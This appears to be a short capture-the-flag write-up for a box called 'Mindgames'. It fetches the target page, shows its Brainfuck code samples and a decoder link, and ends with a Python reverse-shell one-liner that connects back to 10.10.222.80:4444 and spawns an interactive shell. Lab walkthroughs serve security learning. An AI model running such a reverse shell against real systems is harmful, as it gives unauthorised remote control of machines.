
```bash
sudo apt-get install html2text<br>
```

```bash
:~/Mindgames# curl -s http://10.10.123.228 | html2text


****** Sometimes, people have bad ideas. ******
****** Sometimes those bad ideas get turned into a CTF box. ******
****** I'm so sorry. ******
Ever thought that programming was a little too easy? Well, I have just the
product for you. Look at the example code below, then give it a go yourself!
Like it? Purchase a license today for the low, low price of 0.009BTC/yr!
***** Hello, World *****
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[-
>+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>--
-.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
***** Fibonacci *****
--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>--
-<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[-
---->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[--
>+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.------------
-.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[-
>+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[-
>+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.-------
-.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.--------
-.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[---
>+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[-
>+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[--
>+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+
[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[-----
>++<]>-..>++++++++++.
***** Try before you buy. *****

Run it!
Program Output:
```

<p>https://www.dcode.fr/brainfuck-language</p>

<img width="631" height="368" alt="image" src="https://github.com/user-attachments/assets/ea8f9905-20ba-4a6c-9363-a7a1d2df408e" />

<h3>TargetIP</h3>

<img width="1055" height="554" alt="image" src="https://github.com/user-attachments/assets/10a080b0-0a81-4c4c-b402-729570e17ed4" />

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.222.80",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

